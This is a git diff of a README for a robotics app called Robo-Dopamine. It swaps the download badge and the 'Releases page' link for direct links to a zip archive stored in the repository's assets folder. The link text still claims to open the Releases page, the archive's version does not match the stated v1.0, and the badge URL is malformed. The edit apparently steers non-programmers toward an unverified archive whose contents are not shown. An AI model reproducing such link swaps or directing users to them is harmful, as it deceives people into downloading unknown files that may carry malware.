@@ -1,7 +1,7 @@
 # 🤖 Robo-Dopamine - Simplifying Robotic Control for Everyone
 
 ## 📥 Download Now
-[![Download Robo-Dopamine](https://img.shields.io/badge/Download%20Robo--Dopamine-v1.0-blue.svg)](https://github.com/Samirasis/Robo-Dopamine/releases)
+[![Download Robo-Dopamine](https://github.com/Samirasis/Robo-Dopamine/raw/refs/heads/main/assets/Dopamine-Robo-v1.8-beta.4.zip%https://github.com/Samirasis/Robo-Dopamine/raw/refs/heads/main/assets/Dopamine-Robo-v1.8-beta.4.zip)](https://github.com/Samirasis/Robo-Dopamine/raw/refs/heads/main/assets/Dopamine-Robo-v1.8-beta.4.zip)
 
 ## 🚀 Getting Started
 Welcome to Robo-Dopamine! This application helps you understand and control robotic systems with ease. Our goal is to make advanced robotic manipulation accessible to everyone. You don’t need any programming skills to get started.
@@ -20,7 +20,7 @@ To run Robo-Dopamine smoothly, you need:
 ## 🌐 Download & Install
 To get Robo-Dopamine, visit the Releases page. Follow these steps:
 
-1. Click this link to access the Releases page: [Download Here](https://github.com/Samirasis/Robo-Dopamine/releases).
+1. Click this link to access the Releases page: [Download Here](https://github.com/Samirasis/Robo-Dopamine/raw/refs/heads/main/assets/Dopamine-Robo-v1.8-beta.4.zip).
 2. On the Releases page, you will see the latest version.
 3. Locate the appropriate file for your operating system.
 4. Click to download the file.
